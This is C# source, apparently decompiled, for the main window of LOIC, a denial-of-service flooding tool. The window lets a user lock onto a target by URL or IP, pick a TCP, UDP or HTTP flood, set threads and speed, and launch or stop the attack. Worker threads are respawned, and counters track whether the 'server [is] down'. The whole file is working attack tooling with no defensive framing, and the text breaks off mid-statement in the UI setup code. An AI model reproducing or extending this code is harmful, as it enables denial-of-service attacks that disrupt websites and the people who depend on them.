﻿using LOIC.Properties;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Windows.Forms;

namespace LOIC
{
  public class frmMain : Form
  {
    private bool attack;
    private bool browser;
    private static IFlooder[] arr;
    private static string sIP;
    private static string sData;
    private static string sSubsite;
    private static int iPort;
    private static int iThreads;
    private static int iProtocol;
    private static int iDelay;
    private static int iTimeout;
    private static bool bResp;
    private static bool intShowStats;
    private IContainer components;
    private GroupBox groupBox1;
    private Button cmdTargetURL;
    private TextBox txtTargetURL;
    private Label label2;
    private Button cmdTargetIP;
    private TextBox txtTargetIP;
    private Label label1;
    private GroupBox groupBox2;
    private TextBox txtTarget;
    private Label label5;
    private Label label3;
    private GroupBox groupBox3;
    private TextBox txtPort;
    private TextBox txtThreads;
    private ComboBox cbMethod;
    private TextBox txtTimeout;
    private Label label10;
    private GroupBox groupBox4;
    private Button cmdAttack;
    private Label label11;
    private GroupBox groupBox5;
    private Label label22;
    private Label label23;
    private Label lbDownloaded;
    private Label lbDownloading;
    private Label lbRequesting;
    private Label lbConnecting;
    private Label lbIdle;
    private Label label12;
    private Label label13;
    private Label label14;
    private Label label15;
    private Label label16;
    private Label lbFailed;
    private Label lbRequested;
    private TextBox txtSubsite;
    private ToolTip TTip;
    private TextBox txtData;
    private Timer tShowStats;
    private Label label19;
    private Label label7;
    private Label label4;
    private Label label6;
    private Label label20;
    private CheckBox chkResp;
    private TrackBar tbSpeed;
    private Label label18;
    private Label label17;
    private Label label9;
    private Label label21;
    private PictureBox pBanner;
    private WebBrowser cBrowser;

    public frmMain()
    {
      this.InitializeComponent();
    }

    private void frmMain_Load(object sender, EventArgs e)
    {
      this.Text = string.Format("{0} | When harpoons, air strikes and nukes fails | v. {1}", (object) Application.ProductName, (object) Application.ProductVersion);
    }

    private void cmdTargetURL_Click(object sender, EventArgs e)
    {
      string uriString = this.txtTargetURL.Text.ToLower();
      if (uriString.Length == 0)
      {
        using (frmWtf frmWtf = new frmWtf())
        {
          frmWtf.Show();
          int num = (int) MessageBox.Show("A URL is fine too...", "What the shit.");
        }
      }
      else
      {
        if (!uriString.StartsWith("http://"))
        {
          if (!uriString.StartsWith("https://"))
            uriString = "http://" + uriString;
        }
        try
        {
          IPAddress[] addressList = Dns.GetHostEntry(new Uri(uriString).Host).AddressList;
          this.txtTarget.Text = (addressList.Length > 1 ? (object) addressList[new Random().Next(addressList.Length)] : (object) Enumerable.First<IPAddress>((IEnumerable<IPAddress>) addressList)).ToString();
        }
        catch
        {
          using (frmWtf frmWtf = new frmWtf())
          {
            frmWtf.Show();
            int num = (int) MessageBox.Show("Write the complete address", "What the shit.");
          }
        }
      }
    }

    private void cmdTargetIP_Click(object sender, EventArgs e)
    {
      if (this.txtTargetIP.Text.Length == 0)
      {
        using (frmWtf frmWtf = new frmWtf())
        {
          frmWtf.Show();
          int num = (int) MessageBox.Show("I think you forgot the IP.", "What the shit.");
        }
      }
      else
        this.txtTarget.Text = this.txtTargetIP.Text;
    }

    private void txtTarget_Enter(object sender, EventArgs e)
    {
      this.cmdAttack.Focus();
    }

    private void cmdAttack_Click(object sender, EventArgs e)
    {
      if (!this.attack)
      {
        this.attack = true;
        try
        {
          frmMain.sIP = this.txtTarget.Text;
          if (!int.TryParse(this.txtPort.Text, out frmMain.iPort))
            throw new Exception("I don't think ports are supposed to be written like THAT.");
          if (!int.TryParse(this.txtThreads.Text, out frmMain.iThreads))
            throw new Exception("What on earth made you put THAT in the threads field?");
          if (string.IsNullOrEmpty(this.txtTarget.Text) || string.Equals(this.txtTarget.Text, "N O N E !"))
            throw new Exception("Select a target.");
          frmMain.iProtocol = 0;
          switch (this.cbMethod.Text)
          {
            case "TCP":
              frmMain.iProtocol = 1;
              break;
            case "UDP":
              frmMain.iProtocol = 2;
              break;
            case "HTTP":
              frmMain.iProtocol = 3;
              break;
            default:
              throw new Exception("Select a proper attack method.");
          }
          frmMain.sData = this.txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
          if (string.IsNullOrEmpty(frmMain.sData) && (frmMain.iProtocol == 1 || frmMain.iProtocol == 2))
            throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");
          if (!this.txtSubsite.Text.StartsWith("/") && frmMain.iProtocol == 3)
            throw new Exception("You have to enter a subsite (for example \"/\")");
          frmMain.sSubsite = this.txtSubsite.Text;
          if (!int.TryParse(this.txtTimeout.Text, out frmMain.iTimeout))
            throw new Exception("What's up with something like that in the timeout box? =S");
          frmMain.bResp = this.chkResp.Checked;
        }
        catch (Exception ex)
        {
          using (frmWtf frmWtf = new frmWtf())
          {
            frmWtf.Show();
            int num = (int) MessageBox.Show(ex.Message, "What the shit.");
          }
          this.attack = false;
          return;
        }
        this.cmdAttack.Text = "Stop flooding";
        if (!this.browser)
        {
          try
          {
            this.cBrowser.Navigate("https://j.mp/loicweb");
          }
          finally
          {
            this.browser = true;
          }
        }
        switch (frmMain.iProtocol)
        {
          case 1:
          case 2:
            frmMain.arr = (IFlooder[]) Enumerable.ToArray<XXPFlooder>(Enumerable.Select<int, XXPFlooder>(Enumerable.Range(0, frmMain.iThreads), (Func<int, XXPFlooder>) (i => new XXPFlooder(frmMain.sIP, frmMain.iPort, frmMain.iProtocol, frmMain.iDelay, frmMain.bResp, frmMain.sData))));
            break;
          case 3:
            frmMain.arr = (IFlooder[]) Enumerable.ToArray<HTTPFlooder>(Enumerable.Select<int, HTTPFlooder>(Enumerable.Range(0, frmMain.iThreads), (Func<int, HTTPFlooder>) (i => new HTTPFlooder(frmMain.sIP, frmMain.iPort, frmMain.sSubsite, frmMain.bResp, frmMain.iDelay, frmMain.iTimeout))));
            break;
        }
        foreach (IFlooder flooder in frmMain.arr)
          flooder.Start();
        this.tShowStats.Start();
      }
      else
      {
        this.attack = false;
        this.cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
        foreach (IFlooder flooder in frmMain.arr)
          flooder.Stop();
        this.tShowStats.Stop();
        frmMain.arr = (IFlooder[]) null;
      }
    }

    private void tShowStats_Tick(object sender, EventArgs e)
    {
      if (frmMain.intShowStats)
        return;
      frmMain.intShowStats = true;
      switch (frmMain.iProtocol)
      {
        case 1:
        case 2:
          this.lbRequested.Text = Enumerable.Sum<XXPFlooder>(Enumerable.Cast<XXPFlooder>((IEnumerable) frmMain.arr), (Func<XXPFlooder, int>) (f => f.FloodCount)).ToString((IFormatProvider) CultureInfo.InvariantCulture);
          break;
        case 3:
          int num1 = 0;
          int num2 = 0;
          int num3 = 0;
          int num4 = 0;
          int num5 = 0;
          int num6 = 0;
          int num7 = 0;
          for (int index = 0; index < frmMain.arr.Length; ++index)
          {
            HTTPFlooder httpFlooder1 = (HTTPFlooder) frmMain.arr[index];
            num5 += httpFlooder1.Downloaded;
            num6 += httpFlooder1.Requested;
            num7 += httpFlooder1.Failed;
            switch (httpFlooder1.State)
            {
              case ReqState.Ready:
              case ReqState.Completed:
                ++num1;
                break;
              case ReqState.Connecting:
                ++num2;
                break;
              case ReqState.Requesting:
                ++num3;
                break;
              case ReqState.Downloading:
                ++num4;
                break;
            }
            if (!httpFlooder1.IsFlooding)
            {
              int downloaded = httpFlooder1.Downloaded;
              int requested = httpFlooder1.Requested;
              int failed = httpFlooder1.Failed;
              HTTPFlooder httpFlooder2 = new HTTPFlooder(frmMain.sIP, frmMain.iPort, frmMain.sSubsite, frmMain.bResp, frmMain.iDelay, frmMain.iTimeout)
              {
                Downloaded = downloaded,
                Requested = requested,
                Failed = failed
              };
              httpFlooder2.Start();
              frmMain.arr[index] = (IFlooder) httpFlooder2;
            }
          }
          this.lbFailed.Text = num7.ToString((IFormatProvider) CultureInfo.InvariantCulture);
          this.lbRequested.Text = num6.ToString((IFormatProvider) CultureInfo.InvariantCulture);
          this.lbDownloaded.Text = num5.ToString((IFormatProvider) CultureInfo.InvariantCulture);
          this.lbDownloading.Text = num4.ToString((IFormatProvider) CultureInfo.InvariantCulture);
          this.lbRequesting.Text = num3.ToString((IFormatProvider) CultureInfo.InvariantCulture);
          this.lbConnecting.Text = num2.ToString((IFormatProvider) CultureInfo.InvariantCulture);
          this.lbIdle.Text = num1.ToString((IFormatProvider) CultureInfo.InvariantCulture);
          break;
      }
      frmMain.intShowStats = false;
    }

    private void tbSpeed_ValueChanged(object sender, EventArgs e)
    {
      frmMain.iDelay = this.tbSpeed.Value;
      if (frmMain.arr == null)
        return;
      foreach (IFlooder flooder in frmMain.arr)
        flooder.Delay = frmMain.iDelay;
    }

    private void cBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
    {
      this.pBanner.Visible = false;
      this.cBrowser.Visible = true;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.groupBox1 = new GroupBox();
      this.label2 = new Label();
      this.cmdTargetIP = new Button();
      this.txtTargetIP = new TextBox();
      this.label1 = new Label();
      this.cmdTargetURL = new Button();
      this.txtTargetURL = new TextBox();
      this.groupBox2 = new GroupBox();
      this.txtTarget = new TextBox();
      this.label5 = new Label();
      this.label3 = new Label();
      this.groupBox3 = new GroupBox();
      this.label21 = new Label();
      this.label18 = new Label();
      this.label17 = new Label();
      this.label9 = new Label();
      this.label7 = new Label();
      this.label4 = new Label();
      this.label6 = new Label();
      this.label20 = new Label();
      this.chkResp = new CheckBox();
      this.txtData = new TextBox();
      this.txtSubsite = new TextBox();
      this.txtTimeout = new TextBox();
      this.txtThreads = new TextBox();
      this.cbMethod = new ComboBox();
      this.txtPort = new TextBox();
      this.tbSpeed = new TrackBar();
      this.label10 = new Label();
      this.groupBox4 = new GroupBox();
      this.cmdAttack = new Button();
      this.label11 = new Label();
      this.groupBox5 = new GroupBox();
      this.label19 = new Label();
      this.lbFailed = new Label();
      this.lbRequested = new Label();
      this.label22 = new Label();
      this.label23 = new Label();
      this.lbDownloaded = new Label();
      this.lbDownloading = new Label();
      this.lbRequesting = new Label();
      this.lbConnecting = new Label();
      this.lbIdle = new Label();
      this.label12 = new Label();
      this.label13 = new Label();
      this.label14 = new Label();
      this.label15 = new Label();
      this.label16 = new Label();
      this.TTip = new ToolTip(this.components);
      this.tShowStats = new Timer(this.components);
      this.pBanner = new PictureBox();
      this.cBrowser = new WebBrowser();
      this.groupBox1.SuspendLayout();
      this.groupBox2.SuspendLayout();
      this.groupBox3.SuspendLayout();
      this.tbSpeed.BeginInit();
      this.groupBox4.SuspendLayout();
      this.groupBox5.SuspendLayout();
      ((ISupportInitialize) this.pBanner).BeginInit();
      this.SuspendLayout();
      this.groupBox1.Controls.Add((Control) this.label2);
      this.groupBox1.Controls.Add((Control) this.cmdTargetIP);
      this.groupBox1.Controls.Add((Control) this.txtTargetIP);
      this.groupBox1.Controls.Add((Control) this.label1);
      this.groupBox1.Controls.Add((Control) this.cmdTargetURL);
      this.groupBox1.Controls.Add((Control) this.txtTargetURL);
      this.groupBox1.ForeColor = Color.LightBlue;
      this.groupBox1.Location = new Point(212, 12);
      this.groupBox1.Name = "groupBox1";
      this.groupBox1.Size = new Size(465, 75);
      this.groupBox1.TabIndex = 1;
      this.groupBox1.TabStop = false;
      this.groupBox1.Text = "1. Select your target";
      this.label2.Location = new Point(6, 51);
      this.label2.Name = "label2";
      this.label2.Size = new Size(30, 14);
      this.label2.TabIndex = 5;
      this.label2.Text = "IP";
      this.label2.TextAlign = ContentAlignment.MiddleRight;
      this.cmdTargetIP.BackColor = Color.FromArgb(32, 64, 96);
      this.cmdTargetIP.ForeColor = Color.Azure;
      this.cmdTargetIP.Location = new Point(388, 47);
      this.cmdTargetIP.Name = "cmdTargetIP";
      this.cmdTargetIP.Size = new Size(71, 22);
      this.cmdTargetIP.TabIndex = 4;
      this.cmdTargetIP.Text = "Lock on";
      this.cmdTargetIP.UseVisualStyleBackColor = false;
      this.cmdTargetIP.Click += new EventHandler(this.cmdTargetIP_Click);
      this.txtTargetIP.BackColor = Color.FromArgb(24, 48, 64);
      this.txtTargetIP.BorderStyle = BorderStyle.FixedSingle;
      this.txtTargetIP.ForeColor = Color.Azure;
      this.txtTargetIP.Location = new Point(42, 48);
      this.txtTargetIP.Name = "txtTargetIP";
      this.txtTargetIP.Size = new Size(340, 20);
      this.txtTargetIP.TabIndex = 3;
      this.TTip.SetToolTip((Control) this.txtTargetIP, "If you know your target's IP, enter the IP here and click \"Lock on\"");
      this.label1.Location = new Point(6, 23);
      this.label1.Name = "label1";
      this.label1.Size = new Size(30, 14);
      this.label1.TabIndex = 2;
      this.label1.Text = "URL";
      this.label1.TextAlign = ContentAlignment.MiddleRight;
      this.cmdTargetURL.BackColor = Color.FromArgb(32, 64, 96);
      this.cmdTargetURL.ForeColor = Color.Azure;
      this.cmdTargetURL.Location = new Point(388, 19);
      this.cmdTargetURL.Name = "cmdTargetURL";
      this.cmdTargetURL.Size = new Size(71, 22);
      this.cmdTargetURL.TabIndex = 2;
      this.cmdTargetURL.Text = "Lock on";
      this.cmdTargetURL.UseVisualStyleBackColor = false;
      this.cmdTargetURL.Click += new EventHandler(this.cmdTargetURL_Click);
      this.txtTargetURL.BackColor = Color.FromArgb(24, 48, 64);
      this.txtTargetURL.BorderStyle = BorderStyle.FixedSingle;
      this.txtTargetURL.ForeColor = Color.Azure;
      this.txtTargetURL.Location = new Point(42, 20);
      this.txtTargetURL.Name = "txtTargetURL";
      this.txtTargetURL.Size = new Size(340, 20);
      this.txtTargetURL.TabIndex = 1;
      this.TTip.SetToolTip((Control) this.txtTargetURL, "If you don't know your target's IP, enter a URL here and click \"Lock on\"");
      this.groupBox2.Controls.Add((Control) this.txtTarget);
      this.groupBox2.ForeColor = Color.LightBlue;
      this.groupBox2.Location = new Point(212, 116);
      this.groupBox2.Name = "groupBox2";
      this.groupBox2.Size = new Size(758, 106);
      this.groupBox2.TabIndex = 3;
      this.groupBox2.TabStop = false;
      this.groupBox2.Text = "Selected target";
      this.txtTarget.BackColor = Color.FromArgb(24, 48, 64);
      this.txtTarget.BorderStyle = BorderStyle.FixedSingle;
      this.txtTarget.Font = new Font("Arial", 48f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.txtTarget.ForeColor = Color.Azure;
      this.txtTarget.Location = new Point(6, 19);
      this.txtTarget.Name = "txtTarget";
      this.txtTarget.Size = new Size(746, 81);
      this.txtTarget.TabIndex = 1;
      this.txtTarget.TabStop = false;
      this.txtTarget.Text = "N O N E !";
      this.txtTarget.TextAlign = HorizontalAlignment.Center;
      this.TTip.SetToolTip((Control) this.txtTarget, "The currently selected target");
      this.txtTarget.Enter += new EventHandler(this.txtTarget_Enter);
      this.label5.Location = new Point(212, 90);
      this.label5.Name = "label5";
      this.label5.Size = new Size(23, 23);
      this.label5.TabIndex = 7;
      this.label3.Location = new Point(212, 232);
      this.label3.Name = "label3";
      this.label3.Size = new Size(23, 23);
      this.label3.TabIndex = 8;
      this.groupBox3.Controls.Add((Control) this.label21);
      this.groupBox3.Controls.Add((Control) this.label18);
      this.groupBox3.Controls.Add((Control) this.label17);
      this.groupBox3.Controls.Add((Control) this.label9);
      this.groupBox3.Controls.Add((Control) this.label7);
      this.groupBox3.Controls.Add((Control) this.label4);
      this.groupBox3.Controls.Add((Control) this.label6);
      this.groupBox3.Controls.Add((Control) this.label20);
      this.groupBox3.Controls.Add((Control) this.chkResp);
      this.groupBox3.Controls.Add((Control) this.txtData);
      this.groupBox3.Controls.Add((Control) this.txtSubsite);
      this.groupBox3.Controls.Add((Control) this.txtTimeout);
      this.groupBox3.Controls.Add((Control) this.txtThreads);
      this.groupBox3.Controls.Add((Control) this.cbMethod);
      this.groupBox3.Controls.Add((Control) this.txtPort);
      this.groupBox3.Controls.Add((Control) this.tbSpeed);
      this.groupBox3.ForeColor = Color.LightBlue;
      this.groupBox3.Location = new Point(212, 258);
      this.groupBox3.Name = "groupBox3";
      this.groupBox3.Size = new Size(758, 112);
      this.groupBox3.TabIndex = 4;
      this.groupBox3.TabStop = false;
      this.groupBox3.Text = "3. Attack options";
      this.label21.BackColor = Color.Azure;
      this.label21.Location = new Point(6, 61);
      this.label21.Name = "label21";
      this.label21.Size = new Size(746, 1);
      this.label21.TabIndex = 27;
      this.label21.TextAlign = ContentAlignment.MiddleCenter;
      this.label18.Location = new Point(359, 16);
      this.label18.Name = "label18";
      this.label18.Size = new Size(393, 15);
      this.label18.TabIndex = 25;
      this.label18.Text = "TCP / UDP message";
      this.label18.TextAlign = ContentAlignment.MiddleCenter;
      this.label17.Location = new Point(62, 16);
      this.label17.Name = "label17";
      this.label17.Size = new Size(291, 15);
      this.label17.TabIndex = 24;
      this.label17.Text = "HTTP Subsite";
      this.label17.TextAlign = ContentAlignment.MiddleCenter;
      this.label9.Location = new Point(6, 16);
      this.label9.Name = "label9";
      this.label9.Size = new Size(50, 15);
      this.label9.TabIndex = 23;
      this.label9.Text = "Timeout";
      this.label9.TextAlign = ContentAlignment.MiddleCenter;
      this.label7.Location = new Point(168, 94);
      this.label7.Name = "label7";
      this.label7.Size = new Size(75, 15);
      this.label7.TabIndex = 22;
      this.label7.Text = "Threads";
      this.label7.TextAlign = ContentAlignment.MiddleCenter;
      this.label4.Location = new Point(87, 94);
      this.label4.Name = "label4";
      this.label4.Size = new Size(75, 15);
      this.label4.TabIndex = 21;
      this.label4.Text = "Method";
      this.label4.TextAlign = ContentAlignment.MiddleCenter;
      this.label6.Location = new Point(6, 94);
      this.label6.Name = "label6";
      this.label6.Size = new Size(75, 15);
      this.label6.TabIndex = 20;
      this.label6.Text = "Port";
      this.label6.TextAlign = ContentAlignment.MiddleCenter;
      this.label20.Location = new Point(362, 94);
      this.label20.Name = "label20";
      this.label20.Size = new Size(390, 15);
      this.label20.TabIndex = 18;
      this.label20.Text = "<= faster     Speed     slower =>";
      this.label20.TextAlign = ContentAlignment.MiddleCenter;
      this.chkResp.AutoSize = true;
      this.chkResp.Checked = true;
      this.chkResp.CheckState = CheckState.Checked;
      this.chkResp.Location = new Point(249, 72);
      this.chkResp.Name = "chkResp";
      this.chkResp.Size = new Size(91, 18);
      this.chkResp.TabIndex = 7;
      this.chkResp.Text = "Wait for reply";
      this.TTip.SetToolTip((Control) this.chkResp, "Don't disconnect before the server's started to answer");
      this.chkResp.UseVisualStyleBackColor = true;
      this.txtData.BackColor = Color.FromArgb(24, 48, 64);
      this.txtData.BorderStyle = BorderStyle.FixedSingle;
      this.txtData.Font = new Font("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtData.ForeColor = Color.Azure;
      this.txtData.Location = new Point(359, 34);
      this.txtData.Name = "txtData";
      this.txtData.Size = new Size(393, 20);
      this.txtData.TabIndex = 3;
      this.txtData.Text = "A cat is fine too. Desudesudesu~";
      this.txtData.TextAlign = HorizontalAlignment.Center;
      this.TTip.SetToolTip((Control) this.txtData, "The data to send in TCP/UDP mode");
      this.txtSubsite.BackColor = Color.FromArgb(24, 48, 64);
      this.txtSubsite.BorderStyle = BorderStyle.FixedSingle;
      this.txtSubsite.Font = new Font("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtSubsite.ForeColor = Color.Azure;
      this.txtSubsite.Location = new Point(62, 34);
      this.txtSubsite.Name = "txtSubsite";
      this.txtSubsite.Size = new Size(291, 20);
      this.txtSubsite.TabIndex = 2;
      this.txtSubsite.Text = "/";
      this.txtSubsite.TextAlign = HorizontalAlignment.Center;
      this.TTip.SetToolTip((Control) this.txtSubsite, "What subsite to target (when using HTTP as type)");
      this.txtTimeout.BackColor = Color.FromArgb(24, 48, 64);
      this.txtTimeout.BorderStyle = BorderStyle.FixedSingle;
      this.txtTimeout.Font = new Font("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtTimeout.ForeColor = Color.Azure;
      this.txtTimeout.Location = new Point(6, 34);
      this.txtTimeout.Name = "txtTimeout";
      this.txtTimeout.Size = new Size(50, 20);
      this.txtTimeout.TabIndex = 1;
      this.txtTimeout.Text = "9001";
      this.txtTimeout.TextAlign = HorizontalAlignment.Center;
      this.TTip.SetToolTip((Control) this.txtTimeout, "Max time to wait for a response");
      this.txtThreads.BackColor = Color.FromArgb(24, 48, 64);
      this.txtThreads.BorderStyle = BorderStyle.FixedSingle;
      this.txtThreads.Font = new Font("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtThreads.ForeColor = Color.Azure;
      this.txtThreads.Location = new Point(168, 71);
      this.txtThreads.Name = "txtThreads";
      this.txtThreads.Size = new Size(75, 20);
      this.txtThreads.TabIndex = 6;
      this.txtThreads.Text = "10";
      this.txtThreads.TextAlign = HorizontalAlignment.Center;
      this.TTip.SetToolTip((Control) this.txtThreads, "How many users LOIC should emulate");
      this.cbMethod.BackColor = Color.FromArgb(24, 48, 64);
      this.cbMethod.DropDownStyle = ComboBoxStyle.DropDownList;
      this.cbMethod.FlatStyle = FlatStyle.Popup;
      this.cbMethod.Font = new Font("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.cbMethod.ForeColor = Color.Azure;
      this.cbMethod.FormattingEnabled = true;
      this.cbMethod.Items.AddRange(new object[3]
      {
        (object) "TCP",
        (object) "UDP",
        (object) "HTTP"
      });
      this.cbMethod.Location = new Point(87, 69);
      this.cbMethod.Name = "cbMethod";
      this.cbMethod.Size = new Size(75, 22);
      this.cbMethod.TabIndex = 5;
      this.TTip.SetToolTip((Control) this.cbMethod, "What type of attack to launch");
      this.txtPort.BackColor = Color.FromArgb(24, 48, 64);
      this.txtPort.BorderStyle = BorderStyle.FixedSingle;
      this.txtPort.Font = new Font("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtPort.ForeColor = Color.Azure;
      this.txtPort.Location = new Point(6, 70);
      this.txtPort.Name = "txtPort";
      this.txtPort.Size = new Size(75, 20);
      this.txtPort.TabIndex = 4;
      this.txtPort.Text = "80";
      this.txtPort.TextAlign = HorizontalAlignment.Center;
      this.TTip.SetToolTip((Control) this.txtPort, "What port to attack (regular websites use 80)");
      this.tbSpeed.Location = new Point(362, 65);
      this.tbSpeed.Maximum = 20;
      this.tbSpeed.Name = "tbSpeed";
      this.tbSpeed.Size = new Size(390, 45);
      this.tbSpeed.TabIndex = 8;
      this.tbSpeed.ValueChanged += new EventHandler(this.tbSpeed_ValueChanged);
      this.label10.Location = new Point(683, 9);
      this.label10.Name = "label10";
      this.label10.Size = new Size(23, 23);
      this.label10.TabIndex = 9;
      this.groupBox4.Controls.Add((Control) this.cmdAttack);
      this.groupBox4.ForeColor = Color.LightBlue;
      this.groupBox4.Location = new Point(712, 12);
      this.groupBox4.Name = "groupBox4";
      this.groupBox4.Size = new Size(258, 75);
      this.groupBox4.TabIndex = 2;
      this.groupBox4.TabStop = false;
      this.groupBox4.Text = "2. Ready?";
      this.cmdAttack.BackColor = Color.FromArgb(32, 64, 96);
      this.cmdAttack.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.cmdAttack.ForeColor = Color.Azure;
      this.cmdAttack.Location = new Point(6, 19);
      this.cmdAttack.Name = "cmdAttack";
      this.cmdAttack.Size = new Size(246, 50);
      this.cmdAttack.TabIndex = 1;
      this.cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
      this.TTip.SetToolTip((Control) this.cmdAttack, "I sincerely hope you can guess what this button does.");
      this.cmdAttack.UseVisualStyleBackColor = false;
      this.cmdAttack.Click += new EventHandler(this.cmdAttack_Click);
      this.label11.Location = new Point(212, 380);
      this.label11.Name = "label11";
      this.label11.Size = new Size(23, 23);
      this.label11.TabIndex = 10;
      this.groupBox5.Controls.Add((Control) this.label19);
      this.groupBox5.Controls.Add((Control) this.lbFailed);
      this.groupBox5.Controls.Add((Control) this.lbRequested);
      this.groupBox5.Controls.Add((Control) this.label22);
      this.groupBox5.Controls.Add((Control) this.label23);
      this.groupBox5.Controls.Add((Control) this.lbDownloaded);
      this.groupBox5.Controls.Add((Control) this.lbDownloading);
      this.groupBox5.Controls.Add((Control) this.lbRequesting);
      this.groupBox5.Controls.Add((Control) this.lbConnecting);
      this.groupBox5.Controls.Add((Control) this.lbIdle);
      this.groupBox5.Controls.Add((Control) this.label12);
      this.groupBox5.Controls.Add((Control) this.label13);
      this.groupBox5.Controls.Add((Control) this.label14);
      this.groupBox5.Controls.Add((Control) this.label15);
      this.groupBox5.Controls.Add((Control) this.label16);
      this.groupBox5.ForeColor = Color.LightBlue;
      this.groupBox5.Location = new Point(212, 406);
      this.groupBox5.Name = "groupBox5";
      this.groupBox5.Size = new Size(758, 68);
      this.groupBox5.TabIndex = 5;
      this.groupBox5.TabStop = false;
      this.groupBox5.Text = "Attack status";
      this.label19.BackColor = Color.Azure;
      this.label19.Location = new Point(6, 40);
      this.label19.Name = "label19";
      this.label19.Size = new Size(746, 1);
      this.label19.TabIndex = 25;
      this.label19.Text = "Idle";
      this.label19.TextAlign = ContentAlignment.MiddleCenter;
      this.lbFailed.Location = new Point(648, 41);
      this.lbFailed.Name = "lbFailed";
      this.lbFailed.Size = new Size(101, 24);
      this.lbFailed.TabIndex = 24;
      this.lbFailed.TextAlign = ContentAlignment.MiddleCenter;
      this.TTip.SetToolTip((Control) this.lbFailed, "How many times (in total) the webserver didn't respond. High number = server down.");
      this.lbRequested.Location = new Point(541, 41);
      this.lbRequested.Name = "lbRequested";
      this.lbRequested.Size = new Size(101, 24);
      this.lbRequested.TabIndex = 23;
      this.lbRequested.TextAlign = ContentAlignment.MiddleCenter;
      this.TTip.SetToolTip((Control) this.lbRequested, "How many times (in total) a download has been requested");
      this.label22.Location = new Point(648, 16);
      this.label22.Name = "label22";
      this.label22.Size = new Size(101, 24);
      this.label22.TabIndex = 22;
      this.label22.Text = "Failed";
      this.label22.TextAlign = ContentAlignment.MiddleCenter;
      this.label23.Location = new Point(541, 16);
      this.label23.Name = "label23";
      this.label23.Size = new Size(101, 24);
      this.label23.TabIndex = 21;
      this.label23.Text = "Requested";
      this.label23.TextAlign = ContentAlignment.MiddleCenter;
      this.lbDownloaded.Location = new Point(434, 41);
      this.lbDownloaded.Name = "lbDownloaded";
      this.lbDownloaded.Size = new Size(101, 24);
      this.lbDownloaded.TabIndex = 20;
      this.lbDownloaded.TextAlign = ContentAlignment.MiddleCenter;
      this.TTip.SetToolTip((Control) this.lbDownloaded, "How many times (in total) that a download has been initiated");
      this.lbDownloading.BackColor = Color.FromArgb(12, 24, 32);
      this.lbDownloading.Location = new Point(327, 41);
      this.lbDownloading.Name = "lbDownloading";
      this.lbDownloading.Size = new Size(101, 24);
      this.lbDownloading.TabIndex = 19;
      this.lbDownloading.TextAlign = ContentAlignment.MiddleCenter;
      this.TTip.SetToolTip((Control) this.lbDownloading, "How many threads that are downloading information from the server");
      this.lbRequesting.Location = new Point(220, 41);
      this.lbRequesting.Name = "lbRequesting";
      this.lbRequesting.Size = new Size(101, 24);
      this.lbRequesting.TabIndex = 18;
      this.lbRequesting.TextAlign = ContentAlignment.MiddleCenter;
      this.TTip.SetToolTip((Control) this.lbRequesting, "How many threads that are requesting information from the server");
      this.lbConnecting.Location = new Point(113, 41);
      this.lbConnecting.Name = "lbConnecting";
      this.lbConnecting.Size = new Size(101, 24);
      this.lbConnecting.TabIndex = 17;
      this.lbConnecting.TextAlign = ContentAlignment.MiddleCenter;
      this.TTip.SetToolTip((Control) this.lbConnecting, "How many threads that are trying to connect");
      this.lbIdle.Location = new Point(6, 41);
      this.lbIdle.Name = "lbIdle";
      this.lbIdle.Size = new Size(101, 24);
      this.lbIdle.TabIndex = 16;
      this.lbIdle.TextAlign = ContentAlignment.MiddleCenter;
      this.TTip.SetToolTip((Control) this.lbIdle, "How many threads that are without work. Should be 0");
      this.label12.Location = new Point(434, 16);
      this.label12.Name = "label12";
      this.label12.Size = new Size(101, 24);
      this.label12.TabIndex = 15;
      this.label12.Text = "Downloaded";
      this.label12.TextAlign = ContentAlignment.MiddleCenter;
      this.label13.Location = new Point(327, 16);
      this.label13.Name = "label13";
      this.label13.Size = new Size(101, 24);
      this.label13.TabIndex = 14;
      this.label13.Text = "Downloading";
      this.label13.TextAlign = ContentAlignment.MiddleCenter;
      this.label14.Location = new Point(220, 16);
      this.label14.Name = "label14";
      this.label14.Size = new Size(101, 24);
      this.label14.TabIndex = 13;
      this.label14.Text = "Requesting";
      this.label14.TextAlign = ContentAlignment.MiddleCenter;
      this.label15.Location = new Point(113, 16);
      this.label15.Name = "label15";
      this.label15.Size = new Size(101, 24);
      this.label15.TabIndex = 12;
      this.label15.Text = "Connecting";
      this.label15.TextAlign = ContentAlignment.MiddleCenter;
      this.label16.Location = new Point(6, 16);
      this.label16.Name = "label16";
      this.label16.Size = new Size(101, 24);
      this.label16.TabIndex = 11;
      this.label16.Text = "Idle";
      this.label16.TextAlign = ContentAlignment.MiddleCenter;
      this.tShowStats.Interval = 10;
      this.tShowStats.Tick += new EventHandler(this.tShowStats_Tick);
      this.pBanner.Image = (Image) Resources.LOIC;
      this.pBanner.Location = new Point(12, 12);
      this.pBanner.Name = "pBanner";
      this.pBanner.Size = new Size(184, 462);
      this.pBanner.TabIndex = 12;
      this.pBanner.TabStop = false;
      this.cBrowser.IsWebBrowserContextMenuEnabled = false;
      this.cBrowser.Location = new Point(12, 12);
      this.cBrowser.MinimumSize = new Size(20, 20);
      this.cBrowser.Name = "cBrowser";
      this.cBrowser.ScriptErrorsSuppressed = true;
      this.cBrowser.ScrollBarsEnabled = false;
      this.cBrowser.Size = new Size(178, 459);
